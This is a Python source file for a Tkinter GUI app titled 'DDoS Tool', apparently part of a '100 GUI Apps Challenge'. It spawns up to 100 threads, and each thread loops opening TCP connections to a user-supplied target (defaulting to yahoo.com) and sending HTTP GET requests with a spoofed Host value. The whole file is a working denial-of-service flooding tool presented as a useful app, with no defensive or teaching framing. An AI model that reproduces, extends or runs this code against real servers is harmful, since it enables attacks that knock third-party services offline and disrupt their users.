'''
    DDoS Tool with Tkinter / Neir

    Part of 100 GUI Apps Challenge
    (https://github.com/besnoi/pyApps)

    Challenge Rules :
        1. App must be useful
        2. App must be beautiful
        3. App must be short (<500 LOC)

    And lastly no Plagiarism :D
'''

from tkinter import ttk,PhotoImage,END
from tkinter import scrolledtext
import threading,socket
from ttkthemes import ThemedTk

fake_ip = '182.21.20.32'
requests = 0 # no of requests sent
flooding = True

def ddos(target,port=80):
    global requests
    while flooding:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        requests += 1
        s.close()

class MainWindow(ttk.Frame):
    def __init__(self,master):
        super().__init__(master)
        self.pack(pady=10)
        master.wm_title('DDoS Tool')
        label1=ttk.Label(self,text='Target')
        label2=ttk.Label(self,text='Threads')
        label3=ttk.Label(self,text='Port')
        label1.grid(row=0,column=0,padx=10,pady=10,sticky='W')
        label2.grid(row=1,column=0,padx=10,pady=10,sticky='W')
        label3.grid(row=1,column=2,padx=10,pady=10,sticky='W')
        self.target=ttk.Entry(self,width=30)
        self.port=ttk.Entry(self,width=10)
        self.target.insert(0,'yahoo.com')
        self.port.insert(0,'80')
        self.noOfThreads=ttk.Spinbox(self,from_=1, to=100,width=8)
        self.noOfThreads.insert(0,5)
        self.target.grid(row=0,column=1,columnspan=3,padx=10,pady=10)
        self.noOfThreads.grid(row=1,column=1,padx=10,pady=10)
        self.port.grid(row=1,column=3,padx=10,pady=10)
        self.log=scrolledtext.ScrolledText(self,width=40,height=15)
        self.ddosBtn=ttk.Button(self,text='Start',width=40,command=self.onButtonClick)
        self.log.grid(row=2,column=0,columnspan=4,padx=10,pady=10)
        self.ddosBtn.grid(row=3,column=0,columnspan=4,padx=10,pady=10)
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        master.protocol("WM_DELETE_WINDOW", self.onCloseWindow)
        master.iconphoto(False,PhotoImage(file='icon.png'))
        master.mainloop()

    def onButtonClick(self):
        global flooding,requests
        target,noOfThreads,port=self.target.get(),int(self.noOfThreads.get()),int(self.port.get())
        if self.ddosBtn['text']=='Start':
            self.log.insert(END,'Starting...\n')
            self.log.insert(END,f'Target = {target}:{port}\n')
            self.threads=[]
            flooding = True
            requests = 0
            for i in range(1,noOfThreads+1):
                self.log.insert(END,f'Running Thread {i}\n')
                self.threads.append(threading.Thread(target=ddos,args=(target,port)))
                self.threads[-1].start()
            self.ddosBtn['text']='Stop'
        else:
            self.killAllThreads()

    def killAllThreads(self):
        global flooding
        flooding = False
        self.ddosBtn['text']='Start'
        self.log.insert(END,f'Total number of requests sent={requests}\n')
        self.log.insert(END,'Attack Halted!\n')

    def onCloseWindow(self):
        if self.ddosBtn['text']!='Start':
            self.killAllThreads()
        self.master.destroy()


if __name__=='__main__':
    MainWindow(ThemedTk(theme="breeze"))